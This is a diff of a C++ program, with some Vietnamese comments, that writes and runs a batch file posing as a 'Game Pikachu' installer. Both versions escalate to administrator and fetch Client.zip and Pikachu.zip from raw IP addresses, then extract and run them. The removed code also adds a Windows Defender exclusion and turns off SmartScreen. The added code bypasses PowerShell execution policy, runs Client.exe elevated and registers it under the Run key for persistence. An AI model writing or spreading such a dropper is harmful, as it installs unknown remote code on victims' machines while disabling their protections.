@@ -2,72 +2,174 @@
 #include <fstream>
 #include <string>
 #include <cstdlib>
+#include <windows.h>
 
 #ifndef _WIN32
-  #include <sys/stat.h>
-  #include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
 #endif
 
 int main() {
+
 #ifdef _WIN32
-    const std::string filePath = "D://hello.bat";
-    const std::string content = R"(@echo off
-:: Check for admin rights
+
+    const std::string filePath = "D:\\hello.bat";
+
+    const std::string content = R"BAT(
+@echo off
+setlocal
+
+REM =========================
+REM Check admin rights
+REM =========================
+
 net session >nul 2>&1
+
 if %errorlevel% neq 0 (
-powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb runAs"
+    powershell -Command "Start-Process cmd -ArgumentList '/c ""%~f0""' -Verb RunAs"
     exit /b
 )
 
-:: urlClient và đường dẫn file đầu ra (batch syntax)
-set "urlClient=http://172.188.16.91/Client.zip"
-set "outPathClient=%USERPROFILE%\Downloads\Client.zip"
-set "urlPikachu=http://172.188.16.91/pikachu.zip"
-set "outPathPikachu=%USERPROFILE%\Downloads\Pikachu.zip"
+REM =========================
+REM Variables
+REM =========================
+
+set "urlClient=http://13.212.119.185/Client.zip"
+set "outPathClient=%USERPROFILE%\temp\Client.zip"
+
+set "urlPikachu=http://13.212.119.185/Pikachu.zip"
+set "outPathPikachu=%USERPROFILE%\temp\Pikachu.zip"
+
+REM =========================
+REM Create temp folder
+REM =========================
+
+if not exist "%USERPROFILE%\temp" (
+    mkdir "%USERPROFILE%\temp"
+)
 
 timeout /t 1 >nul
-@echo off
-echo Installing Game Pikachu, please wait ...
-powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"
-powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off'"
-timeout /t 1 >nul
-echo Set WshShell = CreateObject("WScript.Shell") > temp.vbs
-echo WshShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '%urlClient%' -OutFile '%outPathClient%' -MaximumRedirection 10 -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }""", 0, True >> temp.vbs
-echo WshShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '%urlPikachu%' -OutFile '%outPathPikachu%' -MaximumRedirection 10 -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }""", 0, True >> temp.vbs
 
-:: Chạy VBScript
-cscript //nologo temp.vbs
+echo Installing Game Pikachu, please wait...
 
-:: Xóa file tạm
-del temp.vbs
+REM =========================
+REM Download files
+REM =========================
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Invoke-WebRequest -Uri '%urlClient%' -OutFile '%outPathClient%'"
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Invoke-WebRequest -Uri '%urlPikachu%' -OutFile '%outPathPikachu%'"
+
+REM =========================
+REM Extract ZIP
+REM =========================
 
 if exist "%outPathClient%" (
-    @REM echo Running the downloaded file...
-    powershell -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path \"%outPathClient%\" -DestinationPath \"%USERPROFILE%\Downloads\Client\" -Force"
-    powershell -NoProfile -Command "Start-Process \"%USERPROFILE%\Downloads\Client\Client.exe\""
-    powershell -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path \"%outPathPikachu%\" -DestinationPath \"%USERPROFILE%\Downloads\Pikachu\" -Force"
-    powershell -NoProfile -Command "Start-Process \"%USERPROFILE%\Downloads\Pikachu\Pikachu.exe\""
-) else (
-    echo Download failed.
-    pause
-)
-)";
 
-    std::ofstream ofs(filePath, std::ios::binary);
+    powershell -NoProfile -Command ^
+    "Expand-Archive -Path '%outPathClient%' -DestinationPath '%USERPROFILE%\temp\Client' -Force"
+
+    powershell -NoProfile -Command ^
+    "Start-Process '%USERPROFILE%\temp\Client\Client.exe' -Verb RunAs"
+
+) else (
+
+    echo Client download failed.
+)
+
+if exist "%outPathPikachu%" (
+
+    powershell -NoProfile -Command ^
+    "Expand-Archive -Path '%outPathPikachu%' -DestinationPath '%USERPROFILE%\temp\Pikachu' -Force"
+
+    powershell -NoProfile -Command ^
+    "Start-Process '%USERPROFILE%\temp\Pikachu\pikachucodien2_setup_nsis.exe'"
+
+) else (
+
+    echo Pikachu download failed.
+)
+
+exit
+)BAT";
+
+    std::ofstream ofs(filePath);
+
     if (!ofs) {
-        std::cerr << "Khong the tao file: " << filePath << "\n";
+        std::cerr << "Cannot create file: " << filePath << "\n";
         return 1;
     }
+
     ofs << content;
     ofs.close();
 
     std::string cmd = "cmd /c \"" + filePath + "\"";
+
     int rc = std::system(cmd.c_str());
+
     if (rc == -1) {
         perror("system");
         return 3;
     }
+
+    HKEY hKey;
+
+    const char* regPath =
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+    const char* appName = "Client";
+
+    char userProfile[MAX_PATH];
+
+    GetEnvironmentVariableA(
+        "USERPROFILE",
+        userProfile,
+        MAX_PATH
+    );
+
+    std::string exePath =
+        std::string(userProfile) +
+        "\\temp\\Client\\Client.exe";
+
+    LONG result = RegOpenKeyExA(
+        HKEY_CURRENT_USER,
+        regPath,
+        0,
+        KEY_SET_VALUE,
+        &hKey
+    );
+
+    if (result == ERROR_SUCCESS) {
+
+        result = RegSetValueExA(
+            hKey,
+            appName,
+            0,
+            REG_SZ,
+            (const BYTE*)exePath.c_str(),
+            exePath.size() + 1
+        );
+
+        RegCloseKey(hKey);
+
+        if (result == ERROR_SUCCESS) {
+            std::cout << "Registry added successfully.\n";
+        }
+        else {
+            std::cout << "Failed to add registry.\n";
+        }
+    }
+    else {
+        std::cout << "Cannot open registry key.\n";
+    }
+
     return 0;
+
 #else
+
+    return 0;
+
 #endif
 }
